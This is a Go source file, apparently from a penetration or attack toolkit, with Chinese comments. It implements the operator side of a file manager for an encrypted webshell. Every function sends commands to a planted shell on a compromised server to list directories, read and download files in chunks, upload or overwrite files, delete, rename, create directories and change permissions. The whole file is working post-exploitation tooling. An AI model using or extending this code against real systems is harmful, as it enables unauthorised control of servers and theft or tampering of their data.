package scanner

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"strconv"
	"strings"
)

// 加密 v2 webshell 的“大马”文件操作（F）。请求/响应都在 AEAD 信封里，
// 路径与文件内容用 base64url 传输；单次读写分块，避免把大文件塞进一条
// HTTP 请求或响应。
const (
	ShellFileChunkSize = 256 << 10
	ShellFileMaxRead   = 512 << 10
	ShellFileListLimit = 3000
)

type ShellFileEntry struct {
	Name     string `json:"name"`
	Type     string `json:"type"` // dir / file / link / other
	Size     int64  `json:"size"`
	Modified int64  `json:"modified"`
	Mode     string `json:"mode"`
}

type ShellFileList struct {
	Path      string           `json:"path"`
	Parent    string           `json:"parent"`
	Entries   []ShellFileEntry `json:"entries"`
	Truncated bool             `json:"truncated"`
}

type ShellFileChunk struct {
	Path   string `json:"path"`
	Offset int64  `json:"offset"`
	Size   int64  `json:"size"`
	EOF    bool   `json:"eof"`
	Data   []byte `json:"-"`
}

type ShellFileWrite struct {
	Path    string `json:"path"`
	Offset  int64  `json:"offset"`
	Written int64  `json:"written"`
	Size    int64  `json:"size"`
}

func shellFileB64(s string) string {
	return base64.RawURLEncoding.EncodeToString([]byte(s))
}

func shellFileUnb64(s string) (string, error) {
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimSpace(s))
	if err != nil {
		return "", err
	}
	return string(raw), nil
}

func shellFileAction(action string, fields ...string) []byte {
	var b strings.Builder
	b.WriteString(action)
	for _, f := range fields {
		b.WriteByte('\n')
		b.WriteString(f)
	}
	return shellWireOp('F', []byte(b.String()))
}

// runShellFileOp sends one file-manager operation through the v2 envelope and
// returns the plaintext reply. ERR replies become Go errors.
func runShellFileOp(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, wire []byte) (string, error) {
	if p.Protocol != ShellProtocolV2 {
		return "", errors.New("只有加密 v2 webshell 支持文件管理")
	}
	req, err := p.v2Request(shellURL, wire)
	if err != nil {
		return "", err
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return "", resp.transportErr()
	}
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("加密 shell 返回 HTTP %d（认证失败、重放或 shell 已失效）", resp.StatusCode)
	}
	out, err := decodeShellResponse(p, resp.Body)
	if err != nil {
		return "", err
	}
	if strings.HasPrefix(out, "ERR\n") {
		msg, derr := shellFileUnb64(strings.SplitN(out, "\n", 2)[1])
		if derr != nil || strings.TrimSpace(msg) == "" {
			return "", errors.New("shell 文件操作失败")
		}
		return "", errors.New(msg)
	}
	return out, nil
}

func shellFileParseInt(s string) int64 {
	n, _ := strconv.ParseInt(strings.TrimSpace(s), 10, 64)
	return n
}

// ListShellFiles lists one directory. An empty path means the shell's current
// working directory, and the reply carries the resolved absolute path.
func ListShellFiles(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, path string) (*ShellFileList, error) {
	if strings.ContainsRune(path, 0) {
		return nil, errors.New("路径包含非法字符")
	}
	out, err := runShellFileOp(ctx, c, shellURL, p, shellFileAction("list", shellFileB64(path)))
	if err != nil {
		return nil, err
	}
	lines := strings.Split(out, "\n")
	if len(lines) < 5 || lines[0] != "LIST" {
		return nil, errors.New("shell 返回的目录列表格式异常")
	}
	abs, err := shellFileUnb64(lines[1])
	if err != nil {
		return nil, errors.New("shell 返回的目录路径无效")
	}
	parent, err := shellFileUnb64(lines[2])
	if err != nil {
		parent = abs
	}
	res := &ShellFileList{Path: abs, Parent: parent, Entries: []ShellFileEntry{}, Truncated: strings.TrimSpace(lines[4]) == "1"}
	for _, line := range lines[5:] {
		if line == "" {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 5 {
			continue
		}
		name, derr := shellFileUnb64(parts[0])
		if derr != nil {
			continue
		}
		typ := "other"
		switch parts[1] {
		case "d":
			typ = "dir"
		case "f":
			typ = "file"
		case "l":
			typ = "link"
		}
		res.Entries = append(res.Entries, ShellFileEntry{
			Name:     name,
			Type:     typ,
			Size:     shellFileParseInt(parts[2]),
			Modified: shellFileParseInt(parts[3]),
			Mode:     parts[4],
		})
	}
	return res, nil
}

// ReadShellFile reads up to length bytes at offset. The shell caps the block at
// 1 MiB; callers should use ShellFileChunkSize for streaming.
func ReadShellFile(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, path string, offset int64, length int) (*ShellFileChunk, error) {
	if strings.ContainsRune(path, 0) {
		return nil, errors.New("路径包含非法字符")
	}
	if offset < 0 {
		offset = 0
	}
	if length <= 0 {
		length = ShellFileChunkSize
	}
	if length > ShellFileMaxRead {
		length = ShellFileMaxRead
	}
	out, err := runShellFileOp(ctx, c, shellURL, p, shellFileAction("read",
		shellFileB64(path), strconv.FormatInt(offset, 10), strconv.Itoa(length)))
	if err != nil {
		return nil, err
	}
	lines := strings.Split(out, "\n")
	if len(lines) < 5 || lines[0] != "DATA" {
		return nil, errors.New("shell 返回的文件内容格式异常")
	}
	abs, err := shellFileUnb64(lines[1])
	if err != nil {
		return nil, errors.New("shell 返回的文件路径无效")
	}
	chunk := &ShellFileChunk{
		Path:   abs,
		Offset: shellFileParseInt(lines[2]),
		Size:   shellFileParseInt(lines[3]),
		EOF:    strings.TrimSpace(lines[4]) == "1",
	}
	if len(lines) > 5 && lines[5] != "" {
		data, derr := base64.RawURLEncoding.DecodeString(lines[5])
		if derr != nil {
			return nil, errors.New("shell 返回的文件内容损坏")
		}
		chunk.Data = data
	}
	return chunk, nil
}

// WriteShellFile writes one chunk. start truncates the target first and must be
// used with offset 0; subsequent chunks carry the running offset.
func WriteShellFile(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, path string, offset int64, start bool, data []byte) (*ShellFileWrite, error) {
	if strings.TrimSpace(path) == "" || strings.ContainsRune(path, 0) {
		return nil, errors.New("路径不能为空或包含非法字符")
	}
	if offset < 0 {
		return nil, errors.New("偏移量不能为负")
	}
	if start && offset != 0 {
		return nil, errors.New("起始分块的偏移量必须为 0")
	}
	if len(data) > ShellFileChunkSize {
		return nil, fmt.Errorf("单次写入不能超过 %d 字节", ShellFileChunkSize)
	}
	flag := "0"
	if start {
		flag = "1"
	}
	out, err := runShellFileOp(ctx, c, shellURL, p, shellFileAction("write",
		shellFileB64(path), strconv.FormatInt(offset, 10), flag, base64.RawURLEncoding.EncodeToString(data)))
	if err != nil {
		return nil, err
	}
	lines := strings.Split(out, "\n")
	if len(lines) < 5 || lines[0] != "WROTE" {
		return nil, errors.New("shell 返回的写入结果格式异常")
	}
	abs, err := shellFileUnb64(lines[1])
	if err != nil {
		return nil, errors.New("shell 返回的文件路径无效")
	}
	return &ShellFileWrite{
		Path:    abs,
		Offset:  shellFileParseInt(lines[2]),
		Written: shellFileParseInt(lines[3]),
		Size:    shellFileParseInt(lines[4]),
	}, nil
}

func shellFileOK(out string) (string, error) {
	lines := strings.Split(out, "\n")
	if len(lines) == 0 || lines[0] != "OK" {
		return "", errors.New("shell 返回的操作结果格式异常")
	}
	if len(lines) < 2 || lines[1] == "" {
		return "", nil
	}
	return shellFileUnb64(lines[1])
}

func DeleteShellPath(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, path string, recursive bool) error {
	if strings.TrimSpace(path) == "" || strings.ContainsRune(path, 0) {
		return errors.New("路径不能为空或包含非法字符")
	}
	rec := "0"
	if recursive {
		rec = "1"
	}
	out, err := runShellFileOp(ctx, c, shellURL, p, shellFileAction("delete", shellFileB64(path), rec))
	if err != nil {
		return err
	}
	_, err = shellFileOK(out)
	return err
}

func RenameShellPath(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, path, target string) error {
	if strings.TrimSpace(path) == "" || strings.TrimSpace(target) == "" ||
		strings.ContainsRune(path, 0) || strings.ContainsRune(target, 0) {
		return errors.New("源路径和目标路径不能为空或包含非法字符")
	}
	out, err := runShellFileOp(ctx, c, shellURL, p, shellFileAction("rename", shellFileB64(path), shellFileB64(target)))
	if err != nil {
		return err
	}
	_, err = shellFileOK(out)
	return err
}

func MkdirShellPath(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, path string) error {
	if strings.TrimSpace(path) == "" || strings.ContainsRune(path, 0) {
		return errors.New("路径不能为空或包含非法字符")
	}
	out, err := runShellFileOp(ctx, c, shellURL, p, shellFileAction("mkdir", shellFileB64(path)))
	if err != nil {
		return err
	}
	_, err = shellFileOK(out)
	return err
}

func ChmodShellPath(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, path, mode string) error {
	if strings.TrimSpace(path) == "" || strings.ContainsRune(path, 0) {
		return errors.New("路径不能为空或包含非法字符")
	}
	mode = strings.TrimSpace(mode)
	if len(mode) < 3 || len(mode) > 4 {
		return errors.New("权限模式必须是 3 到 4 位八进制")
	}
	for _, ch := range mode {
		if ch < '0' || ch > '7' {
			return errors.New("权限模式必须是 3 到 4 位八进制")
		}
	}
	out, err := runShellFileOp(ctx, c, shellURL, p, shellFileAction("chmod", shellFileB64(path), shellFileB64(mode)))
	if err != nil {
		return err
	}
	_, err = shellFileOK(out)
	return err
}
